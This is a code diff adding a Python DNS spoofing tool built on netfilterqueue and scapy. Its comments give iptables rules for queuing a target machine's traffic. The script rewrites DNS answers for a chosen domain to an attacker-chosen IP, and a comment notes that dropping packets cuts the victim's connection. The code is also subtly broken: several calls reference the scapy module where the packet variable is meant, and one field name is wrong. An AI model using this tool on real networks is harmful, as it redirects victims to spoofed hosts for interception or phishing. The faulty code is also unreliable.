@@ -1,0 +1,53 @@
+#send packets to queue by editing ip tables
+
+#run command below to forward packets to queue from target machine
+#   iptables -I FORWARD -j NFQUEUE --queue-num 0
+
+#    run commands below to run on local machine
+#   iptables -I OUTPUT -j NFQUEUE --queue-num 0
+#   iptables -I INPUT -j NFQUEUE --queue-num 0
+
+#   iptables --flush when finished with program
+#make sure to pip-install netfilterqueue
+
+
+import netfilterqueue
+import scapy.all as scapy
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    #print(scapy.packet.show()) to show the different fields of all the packets
+    #DNS Resource Record has the DNS Answer
+    if scapy.packet.haslayer(scapy.DNSRR):
+        #print(scapy.packet.show() will print the layers of the DNS request packets
+        #DNSQR is the DNS Question Record, qname is the field that holds the domain name requested
+        qname = scapy.packet[scapy.DNSQR].qname
+        if 'type url we want to spoof here' in qname:
+            print('[+] Spoofing Target')
+            #rdata is the associated IP to the domain requested. Change this IP to your spoof IP
+            answer = scapy.DNSRR(rrname = qname, rdata="")
+            scapy_packet[scapy.DNS].an = answer
+            # since more than one DNS answer might be sent in the same packet, as indicated by the ancount field
+            # we must modify the encount
+            scapy_packet[scapy.DNS].ancount = 1
+            #now we must delete packet length and packet checksums. Scapy will recalcualte.
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].checksum
+            del scapy_packet[scapy.UDP].checksum
+            del scapy_packet[scapy.UDP].len
+            #set the payload to the modified packet
+            packet.set_payload(str(scapy_packet))
+    #send the packet      
+    packet.accept()
+
+
+
+    #packet.accept() to accept and forward the packet
+    #packet.drop() to cut the internet connection and drop the connection
+
+queue = netfilterqueue.NetfilterQueue()
+
+queue.bind(0, process_packet)
+
+queue.run()
